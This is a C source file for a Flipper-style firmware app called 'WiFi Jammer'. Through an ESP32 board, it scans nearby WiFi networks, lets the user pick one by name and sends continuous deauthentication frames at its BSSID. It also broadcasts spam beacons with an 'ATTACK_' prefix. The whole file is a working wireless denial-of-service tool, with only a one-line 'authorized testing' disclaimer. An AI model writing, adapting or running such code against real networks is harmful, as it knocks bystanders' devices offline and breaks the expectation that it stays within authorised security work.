/*
 * WiFi Jammer - Standalone App for Flipped Firmware
 *
 * Scans for nearby WiFi networks and launches Deauth/Beacon attacks
 * via the ESP32 UART bridge. Requires ESP32 WiFi dev board on GPIO UART.
 *
 * For authorized security testing and educational purposes only.
 */

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/text_box.h>
#include <gui/modules/text_input.h>
#include <notification/notification_messages.h>
#include <furi_hal_serial.h>

#define UART_CH FuriHalSerialIdUsart
#define UART_BAUD 115200
#define RX_BUF_SIZE 512
#define OUTPUT_BUF_SIZE 4000
#define MAX_NETWORKS 32

typedef enum {
    ViewMenu,
    ViewOutput,
    ViewTargetSelect,
    ViewBeaconPrefix,
} AppView;

typedef struct {
    char ssid[64];
    char bssid[18];
    int rssi;
    int channel;
    bool locked;
} NetworkInfo;

typedef struct {
    FuriHalSerialHandle* serial;
    FuriStreamBuffer* rx_stream;
    bool detected;
} WifiModule;

typedef struct {
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Submenu* target_menu;
    TextBox* text_box;
    TextInput* text_input;
    Gui* gui;
    NotificationApp* notification;

    WifiModule wifi;

    char output_buf[OUTPUT_BUF_SIZE];
    size_t output_len;

    NetworkInfo networks[MAX_NETWORKS];
    int network_count;
    int selected_network;

    char beacon_prefix[16];
    bool is_jamming;
} JammerApp;

/* ── UART helpers ── */

static void uart_rx_callback(FuriHalSerialHandle* handle, FuriHalSerialRxEvent event, void* context) {
    JammerApp* app = context;
    if(event == FuriHalSerialRxEventData) {
        uint8_t byte = furi_hal_serial_async_rx(handle);
        furi_stream_buffer_send(app->wifi.rx_stream, &byte, 1, 0);
    }
}

static void wifi_init(JammerApp* app) {
    app->wifi.rx_stream = furi_stream_buffer_alloc(RX_BUF_SIZE, 1);
    app->wifi.serial = furi_hal_serial_control_acquire(UART_CH);
    furi_hal_serial_init(app->wifi.serial, UART_BAUD);
    furi_hal_serial_async_rx_start(app->wifi.serial, uart_rx_callback, app, false);
}

static void wifi_deinit(JammerApp* app) {
    furi_hal_serial_async_rx_stop(app->wifi.serial);
    furi_hal_serial_deinit(app->wifi.serial);
    furi_hal_serial_control_release(app->wifi.serial);
    furi_stream_buffer_free(app->wifi.rx_stream);
}

static void wifi_send(JammerApp* app, const char* cmd) {
    furi_hal_serial_tx(app->wifi.serial, (const uint8_t*)cmd, strlen(cmd));
    furi_hal_serial_tx(app->wifi.serial, (const uint8_t*)"\r\n", 2);
}

static bool wifi_recv_line(JammerApp* app, char* buf, size_t buf_size, uint32_t timeout_ms) {
    size_t pos = 0;
    uint32_t start = furi_get_tick();
    while(furi_get_tick() - start < timeout_ms) {
        uint8_t byte;
        if(furi_stream_buffer_receive(app->wifi.rx_stream, &byte, 1, 10) == 1) {
            if(byte == '\n') {
                if(pos > 0 && buf[pos - 1] == '\r') pos--;
                buf[pos] = '\0';
                return true;
            }
            if(pos < buf_size - 1) buf[pos++] = (char)byte;
        }
    }
    buf[pos] = '\0';
    return pos > 0;
}

static bool wifi_detect(JammerApp* app) {
    uint8_t tmp;
    while(furi_stream_buffer_receive(app->wifi.rx_stream, &tmp, 1, 0) == 1) {}
    wifi_send(app, "AT");
    char resp[32];
    app->wifi.detected = (wifi_recv_line(app, resp, sizeof(resp), 500) && strcmp(resp, "OK") == 0);
    return app->wifi.detected;
}

/* ── Output helpers ── */

static void output_clear(JammerApp* app) {
    app->output_buf[0] = '\0';
    app->output_len = 0;
}

static void output_append(JammerApp* app, const char* text) {
    size_t tlen = strlen(text);
    if(app->output_len + tlen >= OUTPUT_BUF_SIZE - 1) {
        size_t keep = OUTPUT_BUF_SIZE / 2;
        memmove(app->output_buf, app->output_buf + app->output_len - keep, keep);
        app->output_len = keep;
    }
    memcpy(app->output_buf + app->output_len, text, tlen);
    app->output_len += tlen;
    app->output_buf[app->output_len] = '\0';
}

/* ── Logic ── */

static bool parse_scan_line(const char* line, NetworkInfo* net) {
    // Format: RSSIdBm|CHn|SEC|BSSID|SSID
    const char* p = line;

    // RSSI
    net->rssi = atoi(p);
    p = strchr(p, '|'); if(!p) return false; p++;

    // Channel
    if(*p == 'C' && *(p+1) == 'H') p += 2;
    net->channel = atoi(p);
    p = strchr(p, '|'); if(!p) return false; p++;

    // Security
    if(strncmp(p, "OPEN", 4) == 0) net->locked = false;
    else net->locked = true;
    p = strchr(p, '|'); if(!p) return false; p++;

    // BSSID
    strncpy(net->bssid, p, 17); net->bssid[17] = '\0';
    p = strchr(p, '|'); if(!p) return false; p++;

    // SSID
    strncpy(net->ssid, p, 63); net->ssid[63] = '\0';
    
    return true;
}

static void do_stop(JammerApp* app) {
    wifi_send(app, "WIFI_JAM_STOP");
    app->is_jamming = false;
    output_append(app, "\nJamming stopped.\n");
    text_box_set_text(app->text_box, app->output_buf);
    notification_message(app->notification, &sequence_reset_red);
}

static void do_beacon_start(void* context) {
    JammerApp* app = context;
    output_clear(app);
    output_append(app, "Starting Beacon Spam...\n");
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "WIFI_BEACON_START %s 15", app->beacon_prefix);
    wifi_send(app, cmd);
    app->is_jamming = true;
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
    text_box_set_text(app->text_box, app->output_buf);
    notification_message(app->notification, &sequence_set_red_255);
}

static void do_deauth_start(JammerApp* app) {
    NetworkInfo* net = &app->networks[app->selected_network];
    output_clear(app);
    output_append(app, "Continuous Deauth Active!\n");
    output_append(app, "Target: "); output_append(app, net->ssid);
    output_append(app, "\nBSSID: "); output_append(app, net->bssid);
    output_append(app, "\n\nESP32 is looping deauth frames...");
    
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "WIFI_DEAUTH_START %s", net->bssid);
    wifi_send(app, cmd);
    app->is_jamming = true;
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
    text_box_set_text(app->text_box, app->output_buf);
    notification_message(app->notification, &sequence_set_red_255);
}

static void target_select_callback(void* context, uint32_t index) {
    JammerApp* app = context;
    app->selected_network = index;
    do_deauth_start(app);
}

static void menu_callback(void* context, uint32_t index) {
    JammerApp* app = context;
    if(index == 0) { // Scan
        output_clear(app);
        output_append(app, "Scanning WiFi...\n");
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewOutput);
        text_box_set_text(app->text_box, app->output_buf);
        wifi_send(app, "WIFI_SCAN");
        app->network_count = 0;
        char line[128];
        while(wifi_recv_line(app, line, sizeof(line), 10000)) {
            if(strcmp(line, "DONE") == 0) break;
            if(parse_scan_line(line, &app->networks[app->network_count])) {
                app->network_count++;
                if(app->network_count >= MAX_NETWORKS) break;
            }
        }
        output_append(app, "Scan Done.");
        text_box_set_text(app->text_box, app->output_buf);
        submenu_reset(app->target_menu);
        for(int i=0; i<app->network_count; i++) {
            submenu_add_item(app->target_menu, app->networks[i].ssid, i, target_select_callback, app);
        }
    } else if(index == 1) { // Deauth Select
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewTargetSelect);
    } else if(index == 2) { // Beacon Spam
        text_input_reset(app->text_input);
        text_input_set_header_text(app->text_input, "Beacon Prefix:");
        text_input_set_result_callback(app->text_input, do_beacon_start, app, app->beacon_prefix, 16, true);
        view_dispatcher_switch_to_view(app->view_dispatcher, ViewBeaconPrefix);
    } else if(index == 3) { // Stop
        do_stop(app);
    }
}

static uint32_t nav_menu(void* context) { UNUSED(context); return ViewMenu; }

int32_t wifi_jammer_app(void* p) {
    UNUSED(p);
    JammerApp* app = malloc(sizeof(JammerApp));
    memset(app, 0, sizeof(JammerApp));
    strncpy(app->beacon_prefix, "ATTACK_", 16);

    app->gui = furi_record_open(RECORD_GUI);
    app->notification = furi_record_open(RECORD_NOTIFICATION);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    app->submenu = submenu_alloc();
    submenu_add_item(app->submenu, "Scan Networks", 0, menu_callback, app);
    submenu_add_item(app->submenu, "Deauth Target", 1, menu_callback, app);
    submenu_add_item(app->submenu, "Beacon Spam", 2, menu_callback, app);
    submenu_add_item(app->submenu, "Stop Jamming", 3, menu_callback, app);
    view_set_previous_callback(submenu_get_view(app->submenu), (void*)nav_menu);
    view_dispatcher_add_view(app->view_dispatcher, ViewMenu, submenu_get_view(app->submenu));

    app->text_box = text_box_alloc();
    view_set_previous_callback(text_box_get_view(app->text_box), nav_menu);
    view_dispatcher_add_view(app->view_dispatcher, ViewOutput, text_box_get_view(app->text_box));

    app->target_menu = submenu_alloc();
    view_set_previous_callback(submenu_get_view(app->target_menu), nav_menu);
    view_dispatcher_add_view(app->view_dispatcher, ViewTargetSelect, submenu_get_view(app->target_menu));

    app->text_input = text_input_alloc();
    view_set_previous_callback(text_input_get_view(app->text_input), nav_menu);
    view_dispatcher_add_view(app->view_dispatcher, ViewBeaconPrefix, text_input_get_view(app->text_input));

    wifi_init(app);
    wifi_detect(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
    view_dispatcher_run(app->view_dispatcher);

    wifi_send(app, "WIFI_JAM_STOP");
    wifi_deinit(app);
    view_dispatcher_free(app->view_dispatcher);
    submenu_free(app->submenu);
    submenu_free(app->target_menu);
    text_box_free(app->text_box);
    text_input_free(app->text_input);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    free(app);
    return 0;
}
